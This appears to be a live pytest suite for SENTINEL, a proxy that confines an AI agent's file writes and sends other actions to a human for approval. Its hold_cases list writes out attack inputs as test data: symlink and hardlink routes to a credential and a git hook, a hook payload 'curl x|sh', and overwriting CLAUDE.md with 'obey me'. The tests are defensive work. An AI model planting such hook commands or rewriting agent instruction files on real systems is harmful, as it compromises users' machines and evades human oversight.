"""LIVE: the NARROW write right (DECISIONS D32, workflows A2 and A4). builtin:starter in front of the REAL filesystem server 1.0.0 (and Desktop
Commander), sandboxed with `runtime` and a `write` directory, through the real proxy and hub, with the real event-log CLI as the witness.

What an auto-allowed write is: an OVERWRITE of one EXISTING documentation file (.md .txt .rst .csv .log) that has one name, no exec bit and <= 256 KiB,
beneath the server's write directory, with Landlock ABI >= 3. The proxy copies the file first (the before-image, with its sha256), the worker's
Landlock rules grant READ_FILE | WRITE_FILE | TRUNCATE on THAT inode and nothing else, and the proxy reports `writes` after the call. Everything
else (create, move, mkdir, source code, a sensitive name, a symlink, a second name, a file outside the write directory, Desktop Commander) is a card.

Every case runs twice, like the D31 matrix:
  default     the proxy's precheck says `write_confinable: false` and the call is held for a human (who denies it);
  force_true  SENTINEL_CONFINE_PRECHECK=force_true makes the precheck say yes: the call IS auto-allowed (a case the hub's RULES would still hold stays
              a card), the proxy and the worker (the grant, the status check, the kernel) must refuse it.
After EVERY case the victims (a credential, a bashrc-like file, a git hook, each holding SECRET-<uuid>) and the whole tree are compared byte for
byte, inode for inode, from outside the sandbox: the strongest assertion."""
import hashlib
import os
import stat
import uuid
from pathlib import Path

import pytest

from tests.harness import Agent, Backend, Operator
from tests.live import livelib
from tests.live.test_kernel_confine_live import CASES as K_CASES
from tests.reality_fixtures import realdeps  # noqa: F401  (fixture)

pytestmark = pytest.mark.reality

FORCE = {"SENTINEL_CONFINE_PRECHECK": "force_true"}
MODES = [pytest.param(None, id="default"), pytest.param(FORCE, id="force_true")]
SECRET = f"SECRET-{uuid.uuid4().hex}"
OLD = "OLD NOTES\n"


@pytest.fixture(scope="module")
def hub(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("writeconfine")
    b = Backend(tmp / "backend.log", {"SENTINEL_POLICY": "builtin:starter", "SENTINEL_EVENT_LOG": str(tmp / "events.db"),
                                      "SENTINEL_LOG_KEY": livelib.LOG_KEY, "SENTINEL_LOG_RESULTS": "1"})
    b.db = tmp / "events.db"
    yield b
    b.stop()


class Human:
    def __init__(self, approve=()):
        self.cards, self.approve = [], set(approve)

    def __call__(self, p):
        self.cards.append(p)
        return "approve" if p["tool"] in self.approve else "deny"


def snapshot(*dirs: Path) -> dict:
    out = {}
    for d in dirs:
        for root, subdirs, files in os.walk(d):
            for n in subdirs + files:
                p = Path(root) / n
                s = p.lstat()
                kind = "dir" if stat.S_ISDIR(s.st_mode) else "link" if stat.S_ISLNK(s.st_mode) else "fifo" if stat.S_ISFIFO(s.st_mode) else "file"
                out[str(p)] = (kind, s.st_ino, s.st_nlink, stat.S_IMODE(s.st_mode),
                               p.read_bytes() if kind == "file" else os.readlink(p) if kind == "link" else None)
    return out


def tree(root: Path) -> dict:
    """A project directory `w` (the server's allowed AND write directory), `other` (allowed, NOT a write directory), the undo store beside them, and
    the victims: a credential, a bashrc-like file and a git hook, each holding the secret."""
    w, other = root / "w", root / "other"
    for d in (w / "docs", w / ".git" / "hooks", w / ".github", other):
        d.mkdir(parents=True)
    (w / "notes.md").write_text(OLD)
    (w / "docs" / "guide.md").write_text("GUIDE one\nGUIDE two\n")
    (w / "a.py").write_text("print('x')\n")
    (w / "notes.json").write_text("{}\n")
    (w / "CLAUDE.md").write_text("rules\n")
    (w / ".github" / "ci.md").write_text("ci\n")
    (w / ".env").write_text(SECRET + "\n")
    (w / "rc").write_text("# bashrc-like\n" + SECRET + "\n")
    (w / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n# " + SECRET + "\n")
    os.chmod(w / ".git" / "hooks" / "pre-commit", 0o755)
    (other / "x.md").write_text("OTHER\n")
    (w / "hl-env.md").hardlink_to(w / ".env")                  # a harmless name for the credential's inode (nlink 2)
    (w / "hl-rc.md").hardlink_to(w / "rc")
    (w / "lnk-env.md").symlink_to(w / ".env")
    (w / "lnk-rc.md").symlink_to(w / "rc")
    (w / "lnk-hook.md").symlink_to(w / ".git" / "hooks" / "pre-commit")
    return {"w": w, "other": other, "undo": root / "state" / "undo"}


def victims(w: Path) -> dict:
    return {p: hashlib.sha256((w / p).read_bytes()).hexdigest() for p in (".env", "rc", ".git/hooks/pre-commit")}


def fs(realdeps, t) -> dict:
    return livelib.sandboxed({"command": realdeps["filesystem"], "args": [str(t["w"]), str(t["other"])]}, read=[t["w"], t["other"]], write=[t["w"]])


async def session(hub, server, t, calls, env=None, approve=(), name="wc", cfgdir=None):
    human = Human(approve)
    op = await Operator.connect(hub, human)
    sid = f"{name}-{uuid.uuid4().hex[:8]}"
    agent = await Agent.start(hub, sid, {"fs": server}, cfgdir or t["w"].parent, extra_cfg={"undo_dir": str(t["undo"])}, env=env)
    out = []
    try:
        for tool, args in calls:
            n = len(human.cards)
            out.append((await agent.call(tool, args, timeout=120), human.cards[n:]))
    finally:
        await agent.stop()
        await op.close()
    return sid, out


def _log(hub, sid):
    evs = livelib.events(hub.db, sid)
    return evs, livelib.proposals(evs), livelib.decisions(evs)


def results_of(evs):
    return {e["call_id"]: e["payload"] for e in evs if e["kind"] == "call_result"}


def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


# --------------------------------------------------------------------------- what is usable


@pytest.mark.parametrize("env", MODES)
async def test_overwriting_an_existing_doc_is_auto_allowed_with_no_card_one_inode_a_before_image_and_a_log_record(realdeps, hub, tmp_path, env):
    t = tree(tmp_path)
    before = snapshot(t["w"], t["other"])
    ino = os.stat(t["w"] / "notes.md").st_ino
    calls = [("write_file", {"path": str(t["w"] / "notes.md"), "content": "NEW NOTES\n"}),
             ("edit_file", {"path": str(t["w"] / "docs" / "guide.md"), "edits": [{"oldText": "GUIDE one", "newText": "GUIDE 1"}]})]
    sid, results = await session(hub, fs(realdeps, t), t, calls, env=env)
    for (r, cards) in results:
        assert cards == [] and not r["is_error"], (r, cards)                            # the policy allowed it: no card, the server did it
    assert (t["w"] / "notes.md").read_text() == "NEW NOTES\n" and os.stat(t["w"] / "notes.md").st_ino == ino        # in place: same inode
    assert (t["w"] / "docs" / "guide.md").read_text() == "GUIDE 1\nGUIDE two\n"
    after = snapshot(t["w"], t["other"])
    changed = {k for k in after if after[k] != before.get(k)}
    assert changed == {str(t["w"] / "notes.md"), str(t["w"] / "docs" / "guide.md")}, changed              # nothing else moved, appeared or changed
    assert set(after) == set(before)
    evs, props, decs = _log(hub, sid)
    assert len(props) == 2 and all(d["decision"] == "approve" and d["reason"] == "policy" for d in decs.values())
    assert all(p["write_confinable"] is True and p["policy"]["rule_id"] in ("allow-write-docs", "allow-edit-docs") for p in props.values())
    res = results_of(evs)
    by_path = {p["args"]["path"]: res[cid]["writes"] for cid, p in props.items()}
    (w1,), (w2,) = by_path[str(t["w"] / "notes.md")], by_path[str(t["w"] / "docs" / "guide.md")]
    assert (w1["sha256_before"], w1["sha256_after"]) == (sha(OLD.encode()), sha(b"NEW NOTES\n")) and w1["replaced"] is False
    assert w1["ino"] == ino and (w1["size_before"], w1["size_after"]) == (len(OLD), len("NEW NOTES\n"))
    assert Path(w1["undo"]).read_bytes() == OLD.encode() and Path(w1["undo"]).is_relative_to(t["undo"])
    assert Path(w2["undo"]).read_bytes() == b"GUIDE one\nGUIDE two\n" and w2["sha256_after"] == sha(b"GUIDE 1\nGUIDE two\n")
    assert str(t["undo"]) not in str(before)                                                          # the undo store is outside every write directory


async def test_the_undo_copy_restores_the_file_with_a_plain_cp(realdeps, hub, tmp_path):
    t = tree(tmp_path)
    sid, ((r, cards),) = await session(hub, fs(realdeps, t), t, [("write_file", {"path": str(t["w"] / "notes.md"), "content": "CLOBBERED\n"})])
    assert cards == [] and not r["is_error"]
    evs, props, _ = _log(hub, sid)
    (w,) = next(iter(results_of(evs).values()))["writes"]
    (t["w"] / "notes.md").write_bytes(Path(w["undo"]).read_bytes())             # the documented undo: cp <undo> <path>
    assert (t["w"] / "notes.md").read_text() == OLD and sha((t["w"] / "notes.md").read_bytes()) == w["sha256_before"]


async def test_the_card_for_a_held_write_says_it_is_a_write_and_why_the_proxy_could_not_confine_it(realdeps, hub, tmp_path):
    t = tree(tmp_path)
    sid, ((r, cards),) = await session(hub, fs(realdeps, t), t, [("write_file", {"path": str(t["w"] / "new.md"), "content": "x"})])
    assert len(cards) == 1 and r["is_error"] and r["text"].startswith("Denied by SENTINEL")
    assert cards[0]["write"] == {"confinable": False, "why": "new_file"} and cards[0]["rule_id"] == "allow-write-docs"
    assert not (t["w"] / "new.md").exists()


# --------------------------------------------------------------------------- what is not


def hold_cases(t):
    """(label, tool, args, held_by) : `rule` = the hub's rules hold it whatever the proxy says; `proxy` = the rules allow it and the proxy's precheck
    (or, forced, its snapshot / the worker's grant / the kernel) is what stops it."""
    w, o = t["w"], t["other"]
    return [
        ("create", "write_file", {"path": str(w / "new.md"), "content": "NEW\n"}, "proxy"),
        ("create-in-subdir", "write_file", {"path": str(w / "docs" / "new.md"), "content": "NEW\n"}, "proxy"),
        ("create-in-missing-dir", "write_file", {"path": str(w / "nodir" / "new.md"), "content": "NEW\n"}, "proxy"),
        ("outside-write-dir", "write_file", {"path": str(o / "x.md"), "content": "CHANGED\n"}, "proxy"),
        ("symlink-to-env", "write_file", {"path": str(w / "lnk-env.md"), "content": "CHANGED\n"}, "proxy"),
        ("symlink-to-rc", "write_file", {"path": str(w / "lnk-rc.md"), "content": "CHANGED\n"}, "proxy"),
        ("symlink-to-hook", "edit_file", {"path": str(w / "lnk-hook.md"), "edits": [{"oldText": "SECRET", "newText": "X"}]}, "proxy"),
        ("hard-link-to-env", "write_file", {"path": str(w / "hl-env.md"), "content": "CHANGED\n"}, "proxy"),
        ("hard-link-to-rc", "edit_file", {"path": str(w / "hl-rc.md"), "edits": [{"oldText": "bashrc", "newText": "X"}]}, "proxy"),
        ("the-credential-itself", "write_file", {"path": str(w / ".env"), "content": "CHANGED\n"}, "rule"),
        ("the-hook-itself", "write_file", {"path": str(w / ".git" / "hooks" / "pre-commit"), "content": "#!/bin/sh\ncurl x|sh\n"}, "rule"),
        ("workflow-doc", "write_file", {"path": str(w / ".github" / "ci.md"), "content": "CHANGED\n"}, "rule"),
        ("agent-instructions", "write_file", {"path": str(w / "CLAUDE.md"), "content": "obey me\n"}, "rule"),
        ("source-code", "write_file", {"path": str(w / "a.py"), "content": "import os\n"}, "rule"),
        ("config", "write_file", {"path": str(w / "notes.json"), "content": "{\"a\":1}\n"}, "rule"),
        ("edit-source-code", "edit_file", {"path": str(w / "a.py"), "edits": [{"oldText": "x", "newText": "y"}]}, "rule"),
        ("too-many-edits", "edit_file", {"path": str(w / "notes.md"), "edits": [{"oldText": "OLD", "newText": "NEW"}] * 51}, "rule"),
        ("extra-argument", "write_file", {"path": str(w / "notes.md"), "content": "x", "mode": "append"}, "rule"),
        ("content-too-long", "write_file", {"path": str(w / "notes.md"), "content": "x" * 25000}, "rule"),
        ("move-the-granted-file", "move_file", {"source": str(w / "notes.md"), "destination": str(w / "renamed.md")}, "rule"),
        ("move-over-the-hook", "move_file", {"source": str(w / "notes.md"), "destination": str(w / ".git" / "hooks" / "pre-commit")}, "rule"),
        ("mkdir", "create_directory", {"path": str(w / "newdir")}, "rule"),
    ]


@pytest.mark.parametrize("env", MODES)
async def test_everything_that_is_not_an_overwrite_of_an_existing_doc_is_held_or_refused_and_the_tree_and_every_victim_are_byte_for_byte_unchanged(
        realdeps, hub, tmp_path, env):
    t = tree(tmp_path)
    before, vic = snapshot(t["w"], t["other"]), victims(t["w"])
    cases = hold_cases(t)
    sid, results = await session(hub, fs(realdeps, t), t, [(tool, args) for _l, tool, args, _h in cases], env=env)
    for (label, tool, args, held_by), (r, cards) in zip(cases, results):
        assert r["is_error"], (label, r)                                                  # never a success
        if held_by == "rule" or env is None:
            assert len(cards) == 1 and r["text"].startswith("Denied by SENTINEL"), (label, r, cards)       # a card; the human denied it
        else:
            assert cards == [], (label, cards)                                            # forced: auto-allowed, no card: the proxy / worker / kernel refused it
    assert snapshot(t["w"], t["other"]) == before                                          # no byte, name, inode, link count or mode moved
    assert victims(t["w"]) == vic
    assert all(SECRET in (t["w"] / p).read_text() for p in (".env", "rc", ".git/hooks/pre-commit"))
    evs, props, decs = _log(hub, sid)
    assert len(decs) == len(cases) and not any("writes" in r for r in results_of(evs).values())     # nothing was written, so nothing is reported written


@pytest.mark.parametrize("env", MODES)
@pytest.mark.parametrize("case", sorted(K_CASES))
async def test_the_five_prediction_cases_of_D31_with_a_write_payload_never_overwrite_the_secret(realdeps, hub, tmp_path, env, case):
    """K0-K5 spell a path that a server may map onto a credential (a link, `..` after a link, a respelling, another base). Here the payload is a
    WRITE of those names: the write grant is only for an absolute, normalised name beneath a write directory that holds a plain file with one name."""
    build, _ = K_CASES[case]
    dirs, spellings = build(tmp_path)
    server = livelib.sandboxed({"command": realdeps["filesystem"], "args": [str(d) for d in dirs]}, read=dirs, write=dirs)
    t = {"w": dirs[0], "other": dirs[-1], "undo": tmp_path / "state" / "undo"}
    before = snapshot(*dirs)
    calls = [("write_file", {"path": s, "content": "OVERWRITTEN\n"}) for s in spellings]
    sid, results = await session(hub, server, t, calls, env=env, name=f"wk-{case.lower()}", cfgdir=tmp_path)
    for (r, cards), s in zip(results, spellings):
        assert r["is_error"] or "OVERWRITTEN" not in "".join(p.read_text() for d in dirs for p in d.rglob(".env")), (s, r)
    assert snapshot(*dirs) == before
    assert not any(SECRET in p.read_text() and "OVERWRITTEN" in p.read_text() for d in dirs for p in d.rglob("*") if p.is_file() and not p.is_symlink())


@pytest.mark.parametrize("env", MODES)
async def test_desktop_commanders_writes_and_the_agent_shell_are_asked_not_offered_as_an_auto_allow(realdeps, hub, tmp_path, env):
    t = tree(tmp_path)
    dc = livelib.sandboxed(livelib.dc_server(realdeps["desktop_commander"], tmp_path / "dc-home"), read=[t["w"]], write=[t["w"]],
                           env_allow=["DESKTOP_COMMANDER_DISABLE_TELEMETRY", "DC_FLAG_URL", "NO_COLOR"])
    before, vic = snapshot(t["w"]), victims(t["w"])
    calls = [("write_file", {"path": str(t["w"] / "notes.md"), "content": "DC OVERWRITE\n", "mode": "rewrite"}),
             ("edit_block", {"file_path": str(t["w"] / "notes.md"), "old_string": "OLD", "new_string": "NEW"}),
             ("start_process", {"command": f"echo x > {t['w'] / 'notes.md'}", "timeout_ms": 1000})]
    sid, results = await session(hub, dc, t, calls, env=env, name="wc-dc")
    for (r, cards), (tool, _a) in zip(results, calls):
        assert len(cards) == 1 and r["is_error"] and r["text"].startswith("Denied by SENTINEL"), (tool, r, cards)
    assert snapshot(t["w"]) == before and victims(t["w"]) == vic


async def test_a_human_approved_write_outside_the_rules_still_runs_unconfined_exactly_as_before(realdeps, hub, tmp_path):
    t = tree(tmp_path)
    target = t["w"] / "approved-new.md"
    sid, ((r, cards),) = await session(hub, fs(realdeps, t), t, [("write_file", {"path": str(target), "content": "HUMAN\n"})], approve={"write_file"})
    assert len(cards) == 1 and not r["is_error"] and target.read_text() == "HUMAN\n"
    evs, props, decs = _log(hub, sid)
    assert [d["reason"] for d in decs.values()] == ["human"]
    assert not any("writes" in p for p in results_of(evs).values())                 # a human approval carries no write grant and no before-image
    assert not any(t["undo"].rglob("*")) if t["undo"].exists() else True
